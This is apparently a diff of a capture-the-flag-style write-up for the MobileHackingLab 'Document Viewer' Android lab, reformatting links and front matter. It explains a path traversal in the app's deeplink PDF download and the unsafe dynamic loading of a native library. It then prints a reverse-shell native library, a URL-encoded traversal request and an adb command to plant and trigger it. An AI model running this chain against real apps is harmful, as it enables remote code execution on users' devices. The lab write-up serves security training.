@@ -1,31 +1,27 @@
-Title: MobileHackingLab - Document Viewer
-Slug: mobile/mobilehackinglab/document-viewer
-Date: 2024-07-05 18:00
-Category: Mobile
-
+# MobileHackingLab - Document Viewer
 
 ## Static Analysis
 
 After decompiling the DocumentViewer APK, I've noticed that in the `com.mobilehackinglab.documentviewer.MainActivity` there's a dynamic native library loading; if a `libdocviewer_pro.so` is present at `getApplicationContext().getFilesDir() + "native-libraries" + architecture`, it will be loaded and the flag `proFeaturesEnabled` set to true.
 
-![[unsafe-dynamic-code-loading.png]]
+![unsafe-dynamic-code-loading](../../images/mobile/mobilehackinglab/document-viewer/unsafe-dynamic-code-loading.png)
 
 When `proFeaturesEnabled` is set to true, the native `initProFeatures()` is invoked.
 
-![[dynamic-code-execution.png]]
+![dynamic-code-execution](../../images/mobile/mobilehackinglab/document-viewer/dynamic-code-execution.png)
 
 Analyzing the manifest, I noticed that the `MainActivity` has some interesting intent filters:
 
-![[main-activity-deeplink.png]]
+![main-activity-deeplink](../../images/mobile/mobilehackinglab/document-viewer/main-activity-deeplink.png)
 
 Analyzing the `MainActivity` code, it seems that a user can provide a PDF to be opened with the DocumentViewer app via deeplink, which intent is handled by the  `handleIntent()` method. The deeplink allows to fetch PDF from a remote source via http/https protocol.
 The provided PDF will be processed by the `com.mobilehackinglab.documentviewer.CopyUtil` class:
 
-![[copy-util.png]]
+![copy-util](../../images/mobile/mobilehackinglab/document-viewer/copy-util.png)
 
 The `CopyUtil`'s class member `Companion` does not perform any validation or sanitization on the input URI; moreover, it uses the unsafe `getLastPathSegment()` function to get last URI segment (line 50) in order to use it as filename for the output file (line 55):
 
-![[unsafe-uri-usage.png]]
+![unsafe-uri-usage](../../images/mobile/mobilehackinglab/document-viewer/unsafe-uri-usage.png)
 
 An attacker could exploit this usage of untrusted input in order to achieve a Path Traversal attack.
 
@@ -40,7 +36,7 @@ The exploitation strategy will be the following:
 
 In order to complete the step 1, the following native android lib code is compiled:
 
-~~~c
+```c
 #include <jni.h>  
 #include <string>  
 #include <cstdio>  
@@ -87,14 +83,14 @@ void __attribute__ ((constructor)) reverse_shell() {
         execve("/system/bin/sh", nullptr, nullptr);  
     }  
 }
-~~~
+```
 
 In this code, the `initProFeatures` does nothing whilst the `reverse_shell` function gets executed the moment the library is loaded by the application.
  step 
 
 To exploit the path traversal vulnerability (step 2), a web server is configured to run within the following directory tree:
 
-![[webserver-directories-tree.png]]
+![webserver-directories-tree](../../images/mobile/mobilehackinglab/document-viewer/webserver-directories-tree.png)
 
 Then, performing an http request to the webserver as follows:
 `http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so`
@@ -107,12 +103,12 @@ Will result in:
 
 This is done by running:
 
-~~~shell
+```shell
 adb shell am start -a 'android.intent.action.VIEW' -n 'com.mobilehackinglab.documentviewer/.MainActivity' -d 'http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so'
-~~~
+```
 
-![[path-traversal-exploitation.png]]
+![path-traversal-exploitation](../../images/mobile/mobilehackinglab/document-viewer/path-traversal-exploitation.png)
 
 For the last step (3), it's enough to setup a reverse shell listener and simply re-open the application:
 
-![[rce-reverse-shell.png]]
+![rce-reverse-shell](../../images/mobile/mobilehackinglab/document-viewer/rce-reverse-shell.png)
